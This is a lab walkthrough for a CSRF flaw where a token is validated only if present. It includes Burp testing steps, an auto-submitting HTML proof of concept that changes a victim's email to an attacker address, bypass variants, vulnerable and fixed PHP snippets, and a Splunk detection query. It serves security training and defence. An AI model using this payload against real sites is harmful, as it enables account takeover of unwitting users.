# Lab Walkthrough: CSRF Where Token Validation Depends on Token Being Present

* **Vulnerability Type:** Cross-Site Request Forgery (CSRF) / Logic Flaw
* **Target Context:** Client-Side Session Riding (Email Update Functionality)
* **Skill Level:** Apprentice (Beginner)
* **Estimated Completion Time:** 10–15 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [CSRF Implementation Flaws Comparison](https://www.google.com/search?q=%25234-csrf-implementation-flaws-comparison&utm_source=gemini)
5. [Automated Exploitation Script (HTML PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-html-poc&utm_source=gemini)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%25236-defense-hardening--secure-coding&utm_source=gemini)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%25237-siem-detection--telemetry-analysis&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability exposes a fundamental logic flaw in how the backend application validates anti-CSRF tokens.

* **The Core Flaw:** The developer implemented the CSRF validation logic inside a conditional statement that only triggers if the CSRF token parameter is physically present in the HTTP request. If an attacker deletes the parameter entirely, the backend validation block is skipped, and the state-changing action is processed anyway.
* **Real-World Analogy:** Imagine a secure facility where a security guard is instructed, *"If a visitor hands you an ID badge, verify it is authentic."* If a malicious visitor simply walks in *without* handing the guard an ID badge, the guard does nothing to stop them because the condition ("If handed a badge") was never met.
* **The Backend Mechanism (PHP Example):**
* *Vulnerable Logic:* `if (isset($_POST['csrf'])) { validate_token($_POST['csrf']); } process_action();`
* Because `isset()` returns false when the parameter is stripped, `validate_token()` never fires.



> **Learning Checkpoint 1:** Why do developers make this mistake? Often, it stems from retrofitting CSRF protection onto legacy applications. To prevent breaking old API clients or specific front-end components that don't send tokens yet, developers make token validation "optional," creating a critical bypass for attackers.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `/my-account/change-email` endpoint.
* **Primary Objective:** Bypass the CSRF token validation by completely removing the token parameter, forcing a victim to change their email address to one controlled by the attacker.
* **Validation Signal:** The lab is marked solved when the HTML payload is delivered via the exploit server and successfully alters the victim's account email.

---

## 3. Step-by-Step Exploitation Flow

As a cybersecurity explorer, your approach should be systematic and precise. Follow this flow to map and exploit the logic flaw:

* **Phase 1: Baseline Request & Token Validation Check**
* Open Burp Suite's browser and authenticate using `wiener:peter`.
* Navigate to the account page and submit the "Update email" form.
* Intercept the `POST /my-account/change-email` request and send it to **Burp Repeater**.
* **Test Token Integrity:** Modify the `csrf` parameter value (e.g., change the last character).
* *Result:* The server responds with a `403 Forbidden` or validation error. This confirms the backend *does* validate the token's cryptographic integrity.


* **Phase 2: Presence Validation Check (The Bypass)**
* In Burp Repeater, delete the `csrf` parameter and its corresponding value entirely from the request body.
* Hit **Send**.
* *Result:* The server responds with a `302 Found` (redirect), and the email is successfully updated. You have successfully identified a presence-dependent validation flaw.


* **Phase 3: Payload Construction & Execution**
* Navigate to the **Exploit Server**.
* Craft an HTML form targeting the absolute URL of the vulnerable endpoint.
* Include a hidden input for the `email` parameter (set to a new, unique email address).
* **Crucial Step:** Do *not* include a hidden input for the `csrf` parameter in your PoC.
* Inject an auto-submit JavaScript payload.
* Click **Deliver to victim** to execute the attack on the target user and solve the lab.



> **Learning Checkpoint 2:** Why must the target email address in the final exploit be unique? The application enforces business logic that prevents two users from registering the same email. If you test the exploit on yourself with `hacker@evil.com`, and then deliver the exact same payload to the victim, the victim's request will fail because `hacker@evil.com` is now associated with your account.

---

## 4. CSRF Implementation Flaws Comparison

Understanding the nuances of flawed CSRF implementations is vital for identifying bypasses during web app security assessments.

| Flaw Type | Attack Mechanism | Root Cause |
| --- | --- | --- |
| **Method Tampering** | Changing `POST` to `GET`. | Backend only enforces token validation on specific HTTP verbs. |
| **Presence Dependence** | Deleting the `csrf` parameter entirely. | Validation logic is wrapped in an `isset()` or equivalent conditional check. |
| **Token Pooling** | Swapping the victim's token with the attacker's valid token. | Tokens are verified as cryptographically valid, but are not tied to the specific user's session. |
| **Cookie Double Submission** | Injecting a fake CSRF cookie via CRLF or subdomains. | Backend simply verifies that the CSRF cookie matches the CSRF body parameter, without tracking state server-side. |

---

## 5. Automated Exploitation Script (HTML PoC)

This standard HTML template automatically fires the forged request as soon as the DOM loads. The `csrf` parameter is intentionally omitted from the hidden inputs.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF Presence-Dependent Bypass</title>
  </head>
  <body>
    <!-- Hidden form mirroring the target request, omitting the CSRF token -->
    <form id="csrf-form" method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <!-- Attacker-controlled email address -->
      <input type="hidden" name="email" value="pwned-by-attacker-12345@exploit-server.net">
    </form>
    
    <!-- Auto-submission script for zero-click execution -->
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>

```

*Note: Replace `YOUR-LAB-ID` with your active lab instance URL.*

> **Learning Checkpoint 3:** What happens if the backend checks for the parameter but accepts an empty value? If deleting the parameter causes an error, try sending an empty value: `csrf=`. If the backend uses `empty()` checks poorly, this might bypass validation while still satisfying the presence check.

---

## 6. Defense, Hardening & Secure Coding

To prevent presence-dependent bypasses, CSRF validation must be unconditional for all state-changing requests.

* **Unconditional Validation (Primary Defense):** The application framework must reject requests that lack a token entirely, just as it rejects invalid tokens.
* *Insecure (PHP):* `if (!empty($_POST['csrf'])) { validate($_POST['csrf']); }`
* *Secure (PHP):* `if (empty($_POST['csrf']) || !validate($_POST['csrf'])) { die("CSRF Token Missing or Invalid"); }`


* **Global CSRF Middleware:** Use established, well-tested framework middleware (like Spring Security, Django's CSRF middleware, or Express `csurf`) rather than writing custom, conditional validation logic per-endpoint.
* **Defense in Depth:** Implement `SameSite=Lax` or `Strict` on session cookies. Even if the CSRF token validation logic is flawed, the browser will refuse to attach the session cookie to the cross-origin POST request initiated by the exploit server.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting this attack requires monitoring for state-changing requests that are missing expected security parameters.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined method=POST uri_path="/my-account/change-email"
| eval has_csrf_param=if(match(req_body, "csrf="), "Yes", "No")
| search has_csrf_param="No"
| stats count by src_ip, user, referer, uri_path
| where count > 0

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Request fails with `400 Bad Request` when token is removed** | Strict parameter requirements. | The backend explicitly requires the parameter to be present. Try submitting it empty (`csrf=`) or testing alternative bypasses like Method Tampering. |
| **Email doesn't change on victim** | Duplicate email constraint. | Ensure the email address in your PoC is completely unique and hasn't been used in previous testing iterations. |
| **Exploit page doesn't submit** | JavaScript syntax error. | Verify the form `id` matches exactly with `document.getElementById('csrf-form').submit();`. |

---

## 9. References & Standards

* [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://www.google.com/search?q=https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html&utm_source=gemini)
* [PortSwigger: Bypassing CSRF Token Validation](https://www.google.com/search?q=https://portswigger.net/web-security/csrf/bypassing-token-validation&utm_source=gemini)
* [MITRE ATT&CK Framework: Technique T1190 - Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/&utm_source=gemini)

---

**Key Insight:** Defensive mechanisms are only effective when their execution is absolute; wrapping security validation inside conditional logic based on attacker-controlled input completely nullifies the control, allowing an adversary to simply opt out of the security check.
